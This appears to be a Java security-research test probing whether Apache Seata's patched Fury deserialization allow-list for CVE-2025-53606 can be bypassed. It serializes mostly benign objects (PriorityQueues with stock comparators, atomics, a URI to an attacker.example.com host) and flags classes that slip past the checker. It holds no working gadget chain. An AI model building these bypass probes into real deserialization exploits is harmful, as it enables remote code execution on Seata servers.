/**
 * CVE-2025-53606 PriorityQueue Bypass Attempt
 *
 * PriorityQueue is a known gadget chain component in Java deserialization.
 * It calls comparator.compare() during deserialization when reconstructing
 * the heap. If we can set a malicious Comparator, we might achieve code execution.
 *
 * This test checks:
 * 1. Whether PriorityQueue with a custom Comparator passes the AllowListChecker
 * 2. Whether Comparator classes on the Seata classpath could be used as gadgets
 * 3. Whether the TransformingComparator or similar gadget components exist
 */

import org.apache.fury.Fury;
import org.apache.fury.config.CompatibleMode;
import org.apache.fury.config.Language;
import org.apache.fury.resolver.AllowListChecker;

import java.lang.reflect.*;
import java.util.*;
import java.util.concurrent.*;
import java.util.concurrent.atomic.*;

public class PriorityQueueBypass {

    private static Fury createPatchedFury() {
        Fury f = Fury.builder()
                .withLanguage(Language.JAVA)
                .requireClassRegistration(false)
                .withRefTracking(true)
                .withCompatibleMode(CompatibleMode.COMPATIBLE)
                .build();

        AllowListChecker checker = new AllowListChecker(AllowListChecker.CheckLevel.STRICT);
        f.getClassResolver().setClassChecker(checker);

        Set<String> allowPatterns = new HashSet<>();
        allowPatterns.add("java.lang.Boolean");
        allowPatterns.add("java.lang.Byte");
        allowPatterns.add("java.lang.Character");
        allowPatterns.add("java.lang.Double");
        allowPatterns.add("java.lang.Float");
        allowPatterns.add("java.lang.Integer");
        allowPatterns.add("java.lang.Long");
        allowPatterns.add("java.lang.Short");
        allowPatterns.add("java.lang.Number");
        allowPatterns.add("java.lang.Class");
        allowPatterns.add("java.lang.String");
        allowPatterns.add("java.util.ArrayList");
        allowPatterns.add("java.util.LinkedList");
        allowPatterns.add("java.util.HashSet");
        allowPatterns.add("java.util.LinkedHashSet");
        allowPatterns.add("java.util.TreeSet");
        allowPatterns.add("java.util.HashMap");
        allowPatterns.add("java.util.LinkedHashMap");
        allowPatterns.add("java.util.TreeMap");
        allowPatterns.add("org.apache.seata.*");
        allowPatterns.add("org.apache.seata.core.exception.TransactionExceptionCode");
        allowPatterns.add("org.apache.seata.core.model.BranchStatus");
        allowPatterns.add("org.apache.seata.core.model.BranchType");
        allowPatterns.add("org.apache.seata.core.model.GlobalStatus");
        allowPatterns.add("org.apache.seata.core.protocol.ResultCode");

        checker.allowClasses(allowPatterns);
        return f;
    }

    private static Fury createAttackerFury() {
        return Fury.builder()
                .withLanguage(Language.JAVA)
                .requireClassRegistration(false)
                .withRefTracking(true)
                .withCompatibleMode(CompatibleMode.COMPATIBLE)
                .build();
    }

    private static void testPayload(String name, Object obj) {
        try {
            Fury attacker = createAttackerFury();
            Fury patched = createPatchedFury();
            byte[] serialized = attacker.serialize(obj);
            System.out.println("\n[TEST] " + name);
            System.out.println("  Payload class: " + obj.getClass().getName());
            System.out.println("  Serialized: " + serialized.length + " bytes");

            try {
                Object result = patched.deserialize(serialized);
                System.out.println("  [BYPASS] Deserialized: " + result);
                System.out.println("  Result class: " + result.getClass().getName());
                if (result instanceof PriorityQueue) {
                    PriorityQueue<?> pq = (PriorityQueue<?>) result;
                    System.out.println("  Queue size: " + pq.size());
                    System.out.println("  Comparator: " + pq.comparator());
                    for (Object item : pq) {
                        System.out.println("  Element: " + item + " (" +
                            (item != null ? item.getClass().getName() : "null") + ")");
                    }
                }
            } catch (Exception e) {
                String msg = e.getMessage() != null ? e.getMessage() : e.getClass().getName();
                System.out.println("  [BLOCKED/ERROR] " + msg.substring(0, Math.min(msg.length(), 300)));
                // Print the root cause
                Throwable cause = e;
                while (cause.getCause() != null) cause = cause.getCause();
                if (cause != e) {
                    String causeMsg = cause.getMessage() != null ? cause.getMessage() : cause.getClass().getName();
                    System.out.println("  Root cause: " + causeMsg.substring(0, Math.min(causeMsg.length(), 200)));
                }
            }
        } catch (Exception e) {
            System.out.println("\n[TEST] " + name);
            System.out.println("  SERIALIZATION FAILED: " + e.getClass().getName() + ": " +
                (e.getMessage() != null ? e.getMessage().substring(0, Math.min(e.getMessage().length(), 200)) : "null"));
        }
    }

    public static void main(String[] args) throws Exception {
        System.out.println("========================================================================");
        System.out.println("CVE-2025-53606 PriorityQueue & Comparator Bypass Test");
        System.out.println("========================================================================");

        // Test 1: PriorityQueue with natural ordering (String)
        PriorityQueue<String> pq1 = new PriorityQueue<>();
        pq1.add("zebra");
        pq1.add("alpha");
        testPayload("PriorityQueue<String> natural ordering", pq1);

        // Test 2: PriorityQueue with explicit Comparator
        // Collections.reverseOrder() returns a ReverseComparator
        PriorityQueue<String> pq2 = new PriorityQueue<>(Collections.reverseOrder());
        pq2.add("zebra");
        pq2.add("alpha");
        testPayload("PriorityQueue<String> with ReverseComparator", pq2);

        // Test 3: PriorityQueue with String.CASE_INSENSITIVE_ORDER comparator
        PriorityQueue<String> pq3 = new PriorityQueue<>(String.CASE_INSENSITIVE_ORDER);
        pq3.add("Zebra");
        pq3.add("alpha");
        testPayload("PriorityQueue<String> with CASE_INSENSITIVE_ORDER", pq3);

        // Test 4: TreeMap with Comparator (TreeMap is in whitelist)
        TreeMap<String, String> tm1 = new TreeMap<>(Collections.reverseOrder());
        tm1.put("key1", "val1");
        tm1.put("key2", "val2");
        testPayload("TreeMap<String,String> with ReverseComparator", tm1);

        // Test 5: ConcurrentHashMap (bypasses checker) with String keys
        ConcurrentHashMap<String, String> chm = new ConcurrentHashMap<>();
        chm.put("key1", "val1");
        testPayload("ConcurrentHashMap<String,String>", chm);

        // Test 6: Check if we can use URI in a HashMap key
        // URI.hashCode() does computation but doesn't trigger network access
        HashMap<java.net.URI, String> uriMap = new HashMap<>();
        uriMap.put(new java.net.URI("http://attacker.example.com/bypass"), "test");
        testPayload("HashMap<URI,String> (URI bypasses checker)", uriMap);

        // Test 7: PriorityQueue<Integer> - Integer compareTo doesn't do anything dangerous
        PriorityQueue<Integer> pqInt = new PriorityQueue<>();
        pqInt.add(42);
        pqInt.add(1);
        testPayload("PriorityQueue<Integer>", pqInt);

        // Test 8: Check if we can create a HashMap<String, HashMap<String, ?>>
        // that eventually contains a non-whitelisted type deep in the nesting
        HashMap<String, Object> nested = new HashMap<>();
        HashMap<String, Object> inner = new HashMap<>();
        inner.put("safe", "value");
        inner.put("atomic", new AtomicInteger(42)); // AtomicInteger bypasses checker
        nested.put("inner", inner);
        testPayload("Nested HashMap with AtomicInteger (bypasses checker)", nested);

        // Test 9: Check xreadClass behavior - try to use a class that might be
        // registered under a different name
        testPayload("Collections.emptyList()", Collections.emptyList());
        testPayload("Collections.singletonList('test')", Collections.singletonList("test"));

        // Test 10: Check if exceptions pass through
        // org.apache.seata.* classes ARE whitelisted
        // Can we find a Seata class that's dangerous?
        try {
            Class<?> seataClass = Class.forName("org.apache.seata.core.protocol.transaction.GlobalBeginRequest");
            Object seataObj = seataClass.newInstance();
            testPayload("Seata GlobalBeginRequest (whitelisted)", seataObj);
        } catch (Exception e) {
            System.out.println("\n[SKIP] Seata protocol class not on classpath: " + e);
        }

        // Test 11: AtomicReference holding another bypassed type
        AtomicReference<AtomicInteger> refOfAtomic = new AtomicReference<>(new AtomicInteger(999));
        testPayload("AtomicReference<AtomicInteger> (both bypass)", refOfAtomic);

        System.out.println("\n========================================================================");
        System.out.println("ANALYSIS COMPLETE");
        System.out.println("========================================================================");
    }
}
